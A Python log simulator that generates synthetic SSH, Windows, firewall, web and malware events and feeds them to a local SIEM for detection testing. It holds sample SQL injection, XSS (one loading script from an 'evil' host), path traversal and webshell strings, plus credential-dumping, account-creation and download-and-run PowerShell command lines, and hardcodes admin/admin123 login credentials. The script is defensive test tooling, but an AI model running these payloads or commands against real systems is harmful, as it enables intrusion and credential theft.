"""
Demo log simulator - generates realistic security log data and sends it to the mini SIEM.
Useful for testing and developing the platform.
"""
import json
import os
import random
import time
import requests
from datetime import datetime, timedelta

BASE_URL = os.environ.get("SIEM_URL", "http://localhost:8000/api")
TOKEN = ""


def load_token():
    global TOKEN
    resp = requests.post(f"{BASE_URL}/auth/login", json={"username": "admin", "password": "admin123"})
    if resp.status_code == 200:
        TOKEN = resp.json()["access_token"]
        return True
    print(f"Failed to login: {resp.text}")
    return False


def send_event(events):
    headers = {"Authorization": f"Bearer {TOKEN}"}
    for event in events:
        try:
            resp = requests.post(f"{BASE_URL}/events/ingest", json=event, headers=headers)
            if resp.status_code != 201:
                print(f"Error: {resp.status_code} {resp.text}")
        except requests.exceptions.ConnectionError:
            print("Connection error - is the server running?")
            time.sleep(5)


def generate_auth_events():
    """Generate SSH login events."""
    usernames = ["admin", "root", "user1", "jenkins", "deploy", "oracle", "test"]
    valid_users = ["admin", "user1", "jenkins"]
    ips = ["192.168.1.100", "10.0.0.5", "192.168.1.50", "10.0.0.12",
           "172.16.2.3", "185.220.101.42", "91.240.118.66", "45.155.205.5"]

    events = []
    for _ in range(random.randint(1, 10)):
        ip = random.choice(ips)
        is_bruteforce = ip in ["185.220.101.42", "91.240.118.66", "45.155.205.5"]
        if is_bruteforce and random.random() < 0.7:
            # Brute force from suspicious IP
            user = random.choice(valid_users)
            event = {
                "source_name": "auth-server-01",
                "source_type": "auth",
                "hostname": "auth-server-01",
                "ip_address": "192.168.1.10",
                "event_type": "failed_login",
                "description": f"Failed password for {user} from {ip} port 22 ssh2",
                "source_ip": ip,
                "user": user,
                "severity": "info",
                "raw_data": f"Failed password for {user} from {ip} port 22 ssh2",
            }
            events.append(event)
        elif random.random() < 0.5:
            user = random.choice(valid_users)
            event = {
                "source_name": "auth-server-01",
                "source_type": "auth",
                "hostname": "auth-server-01",
                "ip_address": "192.168.1.10",
                "event_type": "failed_login",
                "description": f"Failed password for {user} from {ip} port 22 ssh2",
                "source_ip": ip,
                "user": user,
                "severity": "info",
                "raw_data": f"Failed password for {user} from {ip} port 22 ssh2",
            }
            events.append(event)
        else:
            user = random.choice(valid_users)
            log_type = random.choice(["Accepted", "session opened", "session closed"])
            if log_type == "Accepted":
                event = {
                    "source_name": "auth-server-01",
                    "source_type": "auth",
                    "hostname": "auth-server-01",
                    "ip_address": "192.168.1.10",
                    "event_type": "successful_login",
                    "description": f"Accepted password for {user} from {ip} port 22 ssh2",
                    "source_ip": ip,
                    "user": user,
                    "severity": "info",
                    "raw_data": f"Accepted password for {user} from {ip} port 22 ssh2",
                }
            else:
                event = {
                    "source_name": "auth-server-01",
                    "source_type": "auth",
                    "hostname": "auth-server-01",
                    "ip_address": "192.168.1.10",
                    "event_type": "session_event",
                    "description": f"{log_type} for user {user}",
                    "source_ip": ip,
                    "user": user,
                    "severity": "info",
                }
            events.append(event)
    return events


def generate_windows_events():
    """Generate Windows Security Event Log events."""
    windows_hosts = ["WIN-SERVER-01", "WIN-WORKSTATION-05", "DC-01"]
    users = ["Administrator", "jsmith", "svc_backup", "bob.jones"]
    internal_ips = ["10.0.1.5", "10.0.1.10", "10.0.1.20", "192.168.2.5"]

    event_templates = [
        # (event_id, event_type, description)
        ("4624", "successful_logon", "An account was successfully logged on."),
        ("4625", "failed_logon", "An account failed to log on."),
        ("4720", "user_account_created", "A user account was created."),
        ("4732", "member_added_to_security_group", "A member was added to a security-enabled local group."),
        ("4728", "member_added_to_security_group", "A member was added to a security-enabled global group."),
        ("4740", "account_locked_out", "A user account was locked out."),
        ("4672", "special_privileges_assigned", "Special privileges assigned to new logon."),
        ("1102", "audit_log_cleared", "The audit log was cleared."),
        ("7045", "service_installed", "A service was installed in the system."),
        ("4769", "kerberos_service_ticket_requested", "A Kerberos service ticket was requested."),
        ("6005", "event_log_service_started", "The Event log service was started."),
    ]

    events = []
    num_events = random.randint(3, 15)
    for _ in range(num_events):
        host = random.choice(windows_hosts)
        user = random.choice(users)
        ip = random.choice(internal_ips)
        event_id, event_type, desc = random.choice(event_templates)
        
        # Simulate brute force pattern: many failed logons from same IP
        if random.random() < 0.3 and event_type == "failed_logon":
            # Cluster of failures
            for i in range(random.randint(3, 8)):
                events.append({
                    "source_name": f"{host}-logs",
                    "source_type": "windows",
                    "hostname": host,
                    "ip_address": ip,
                    "event_type": "failed_logon",
                    "event_id": "4625",
                    "description": f"An account failed to log on. Source: {user}, IP: {ip}, Error: 0xC0000064",
                    "user": user,
                    "source_ip": ip,
                    "severity": "info",
                })
        elif event_type == "successful_logon":
            events.append({
                "source_name": f"{host}-logs",
                "source_type": "windows",
                "hostname": host,
                "ip_address": ip,
                "event_type": "successful_logon",
                "event_id": "4624",
                "description": f"An account was successfully logged on. Subject: {user}, Source IP: {ip}",
                "user": user,
                "source_ip": ip,
                "severity": "info",
            })
        elif event_type in ("user_account_created", "member_added_to_security_group") and random.random() < 0.2:
            events.append({
                "source_name": f"{host}-logs",
                "source_type": "windows",
                "hostname": host,
                "ip_address": ip,
                "event_type": event_type,
                "event_id": event_id,
                "description": f"{desc} Subject: {user}, New member: {random.choice(['hacker', 'temp_acct', 'sysadmin'])}+",
                "user": user,
                "severity": "info",
            })
        elif event_type == "audit_log_cleared" and random.random() < 0.1:
            events.append({
                "source_name": f"{host}-logs",
                "source_type": "windows",
                "hostname": host,
                "ip_address": ip,
                "event_type": "audit_log_cleared",
                "event_id": "1102",
                "description": "The audit log was cleared.",
                "user": user,
                "severity": "high",
            })
        elif event_type == "service_installed" and random.random() < 0.15:
            events.append({
                "source_name": f"{host}-logs",
                "source_type": "windows",
                "hostname": host,
                "ip_address": ip,
                "event_type": "service_installed",
                "event_id": "7045",
                "description": f"A service was installed in the system. Service Name: {random.choice(['backdoor_svc', 'botnet', 'srv_update', 'netstart'])}",
                "user": user,
                "process_name": random.choice(["msiexec.exe", "powershell.exe", "cmd.exe"]),
                "severity": "info",
            })
        else:
            events.append({
                "source_name": f"{host}-logs",
                "source_type": "windows",
                "hostname": host,
                "ip_address": ip,
                "event_type": event_type,
                "event_id": event_id,
                "description": f"{desc} Subject: {user}",
                "user": user,
                "severity": "info",
            })
    return events


def generate_firewall_events():
    """Generate firewall/network events."""
    firewall_ips = ["10.0.1.1", "10.0.0.1"]
    internal = ["192.168.1.100", "10.0.1.5", "10.0.0.12"]
    external = ["8.8.8.8", "1.1.1.1", "185.220.101.42", "45.155.205.5", "91.240.118.66",
                "5.188.10.10", "104.248.201.12", "83.150.214.174"]
    ports = [22, 80, 443, 8080, 3306, 3389, 21, 25, 53, 445, 139, 135, 23, 5555]

    events = []
    num_events = random.randint(2, 8)
    for _ in range(num_events):
        fw = random.choice(firewall_ips)
        src = random.choice(internal + external)
        dst = random.choice(external + internal)
        port = random.choice(ports)
        action = random.choice(["ALLOW", "DENY", "ALLOW", "DENY", "DROP"])

        events.append({
            "source_name": "firewall-gateway-01",
            "source_type": "firewall",
            "hostname": "firewall-gateway-01",
            "ip_address": fw,
            "event_type": "firewall_rule_hit",
            "description": f"{action} {src}:{random.randint(10000, 65535)} -> {dst}:{port} proto=tcp",
            "source_ip": src,
            "destination_ip": dst,
            "destination_port": port,
            "severity": "info",
        })
    return events


def generate_web_events():
    """Generate web server access logs (normal + attack patterns)."""
    web_ips = ["192.168.1.60", "192.168.1.70"]
    client_ips = ["172.16.1.50", "172.16.1.22", "10.0.2.15"]
    attacker_ips = ["185.220.101.42", "45.155.205.5", "91.240.118.66", "5.188.10.10"]
    paths = ["/login", "/admin", "/index.php", "/wp-login.php", "/api/v1/", "/download/", "/upload/"]
    methods = ["GET", "POST", "PUT", "DELETE"]
    statuses = [200, 200, 200, 301, 302, 401, 403, 404, 500]

    # Attack request templates for detection coverage
    attack_requests = [
        ("POST", "/login?id=1' OR '1'='1", "SQLi", 403),
        ("GET", "/shop?cat=1 UNION SELECT username,password FROM users", "SQLi", 500),
        ("GET", "/search?q=';DROP TABLE users;--", "SQLi", 500),
        ("GET", "/page?id=1 AND SLEEP(5)", "SQLi", 500),
        ("GET", "/index.php?id=1' union select load_file('/etc/passwd')--", "SQLi", 403),
        ("GET", "/search?q=<script>alert('xss')</script>", "XSS", 403),
        ("POST", "/comment?msg=<script src=http://evil/x.js></script>", "XSS", 403),
        ("GET", "/profile?user=<img src=x onerror=alert(1)>", "XSS", 403),
        ("GET", "/download?file=../../../../etc/passwd", "Pathtrav", 404),
        ("GET", "/..%2f..%2f..%2fetc%2fpasswd", "Pathtrav", 404),
        ("POST", "/upload/shell.php", "Upload", 200),
        ("GET", "/cmd.php?cmd=whoami", "Upload", 200),
        ("POST", "/update/webshell.jsp", "Upload", 200),
    ]

    events = []
    num_events = random.randint(5, 15)

    # Sometimes inject an attack chain from an attacker IP
    if random.random() < 0.6:
        attacker = random.choice(attacker_ips)
        payload = random.choice(attack_requests)
        method, path, kind, status = payload
        events.append({
            "source_name": "web-server-01",
            "source_type": "web_server",
            "hostname": "web-server-01",
            "ip_address": random.choice(web_ips),
            "event_type": "web_access",
            "description": f"{method} {path} HTTP/1.1",
            "source_ip": attacker,
            "response_code": str(status),
            "severity": "info",
            "extra_data": {"attack_type": kind, "url": path, "method": method},
            "raw_data": f'{attacker} - - [01/Jan/2024:12:00:00 +0000] "{method} {path} HTTP/1.1" {status} 512',
        })

    for _ in range(num_events):
        src = random.choice(client_ips)
        path = random.choice(paths)
        method = random.choice(methods)
        status = random.choice(statuses)

        # WordPress admin attack
        if path in ("/wp-login.php", "/admin") and random.random() < 0.4:
            status = random.choice([401, 403])

        events.append({
            "source_name": "web-server-01",
            "source_type": "web_server",
            "hostname": "web-server-01",
            "ip_address": random.choice(web_ips),
            "event_type": "web_access",
            "description": f"{method} {path} HTTP/1.1",
            "source_ip": src,
            "response_code": str(status),
            "severity": "info",
            "raw_data": f'{src} - - [01/Jan/2024:12:00:00 +0000] "{method} {path} HTTP/1.1" {status} 512',
        })

    # Sometimes a web login brute force burst from a single IP
    if random.random() < 0.3:
        attacker = random.choice(attacker_ips)
        for _ in range(random.randint(12, 25)):
            events.append({
                "source_name": "web-server-01",
                "source_type": "web_server",
                "hostname": "web-server-01",
                "ip_address": random.choice(web_ips),
                "event_type": "web_access",
                "description": "POST /wp-login.php HTTP/1.1",
                "source_ip": attacker,
                "response_code": "401",
                "severity": "info",
            })

    return events


def generate_correlation_events():
    """Generate a coordinated attack chain: external IP scans network (firewall)
    then performs credential brute force (auth) - triggers cross-source correlation."""
    events = []
    attacker_ips = ["185.220.101.42", "45.155.205.5", "91.240.118.66"]
    if random.random() < 0.7:
        attacker = random.choice(attacker_ips)
        # Stage 1: network scanning from attacker (firewall drop/deny hits)
        for _ in range(random.randint(3, 6)):
            events.append({
                "source_name": "firewall-gateway-01",
                "source_type": "firewall",
                "hostname": "firewall-gateway-01",
                "ip_address": "10.0.1.1",
                "event_type": "firewall_rule_hit",
                "description": f"DROP {attacker}:{random.randint(10000, 65535)} -> 10.0.0.12:{random.choice([22, 80, 443, 3389, 3306])} proto=tcp",
                "source_ip": attacker,
                "destination_ip": "10.0.0.12",
                "destination_port": random.choice([22, 80, 443, 3389, 3306]),
                "severity": "info",
            })
        # Stage 2: credential brute force from same attacker (auth SFTP/SSH logins)
        for _ in range(random.randint(5, 10)):
            events.append({
                "source_name": "auth-01",
                "source_type": "auth",
                "hostname": "auth-01",
                "ip_address": "10.0.0.5",
                "event_type": "failed_login",
                "description": f"Failed password for invalid user hacker from {attacker} port {random.randint(40000, 60000)} ssh2",
                "source_ip": attacker,
                "user": "hacker",
                "severity": "info",
            })
    return events


def generate_malware_events():
    """Generate malware-related events."""
    events = []
    if random.random() < 0.25:
        processes = ["mimikatz.exe", "powershell.exe", "cmd.exe"]
        command = [
            "powershell -enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQA=", 
            "./mimikatz.exe privilege::debug sekurlsa::logonpasswords",
            "Invoke-Mimikatz -DumpCreds",
            "cmd /c net user hacker P@ssw0rd /add",
            'powershell -command "IEX(New-Object Net.WebClient).DownloadString(Server)"',
        ]
        events.append({
            "source_name": "WIN-WORKSTATION-05-logs",
            "source_type": "windows",
            "hostname": "WIN-WORKSTATION-05",
            "ip_address": "10.0.1.15",
            "event_type": "process_creation",
            "description": "New process created",
            "process_name": random.choice(processes),
            "process_id": str(random.randint(1000, 9999)),
            "command_line": random.choice(command),
            "file_path": f"C:\\Users\\creditadmin\\\\{random.choice(['mimikatz', 'dump', 'backup', 'update'])}.exe" if random.random() < 0.5 else "C:\\Windows\\Temp\\",
            "user": "Administrator",
            "severity": "info",
        })
    return events


def main():
    if not load_token():
        return

    print("Starting log simulator. Press Ctrl+C to stop.")
    
    sources = {
        "auth": generate_auth_events,
        "windows": generate_windows_events,
        "firewall": generate_firewall_events,
        "web": generate_web_events,
        "malware": generate_malware_events,
    }

    try:
        while True:
            events = []
            for source_type, generator in sources.items():
                events.extend(generator())
            
            if events:
                send_event(events)
            time.sleep(random.uniform(1, 3))
    except KeyboardInterrupt:
        print("\nStopping simulator.")


if __name__ == "__main__":
    main()
